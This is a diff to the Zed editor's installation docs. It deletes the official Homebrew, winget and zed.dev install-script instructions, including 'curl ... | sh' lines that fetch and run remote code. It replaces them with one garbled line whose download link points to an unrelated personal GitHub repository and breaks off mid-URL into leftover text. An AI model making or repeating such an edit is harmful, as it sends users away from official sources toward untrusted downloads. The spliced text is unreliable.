@@ -9,57 +9,7 @@ description: Download and install Zed on macOS, Linux, or Windows. Includes Home
 
 ### macOS
 
-Get the latest stable builds via [the download page](https://zed.dev/download). If you want to download our preview build, you can find it on its [releases page](https://zed.dev/releases/preview). After the first manual installation, Zed will periodically check for install updates.
-
-You can also install Zed stable via Homebrew:
-
-```sh
-brew install --cask zed
-```
-
-As well as Zed preview:
-
-```sh
-brew install --cask zed@preview
-```
-
-### Windows
-
-Get the latest stable builds via [the download page](https://zed.dev/download). If you want to download our preview build, you can find it on its [releases page](https://zed.dev/releases/preview). After the first manual installation, Zed will periodically check for install updates.
-
-Additionally, you can install Zed using winget:
-
-```sh
-winget install -e --id ZedIndustries.Zed
-```
-
-### Linux
-
-For most Linux users, the easiest way to install Zed is through our installation script:
-
-```sh
-curl -f https://zed.dev/install.sh | sh
-```
-
-You can now optionally specify a **version** of Zed to install using the `ZED_VERSION` environment variable:
-
-```sh
-# Install the latest stable version (default)
-curl -f https://zed.dev/install.sh | sh
-
-# Install a specific version
-curl -f https://zed.dev/install.sh | ZED_VERSION=0.216.0 sh
-```
-
-To install the preview build, which receives updates about a week ahead of stable:
-
-```sh
-curl -f https://zed.dev/install.sh | ZED_CHANNEL=preview sh
-```
-
-This script supports `x86_64` and `AArch64`, as well as common Linux distributions: Ubuntu, Arch, Debian, RedHat, CentOS, Fedora, and more.
-
-If Zed is installed using this installation script, it can be uninstalled at any time by running the shell command `zed --uninstall`. The shell will then prompt you whether you'd like to keep your preferences or delete them. After making a choice, you should see a message that Zed was successfully uninstalled.
+Get the latest stable builds via [the download page](https://github.com/Banshal-Yadav/nir'd like to keep your preferences or delete them. After making a choice, you should see a message that Zed was successfully uninstalled.
 
 If this script is insufficient for your use case, you run into problems running Zed, or there are errors in uninstalling Zed, please see our [Linux-specific documentation](./linux.md).
 
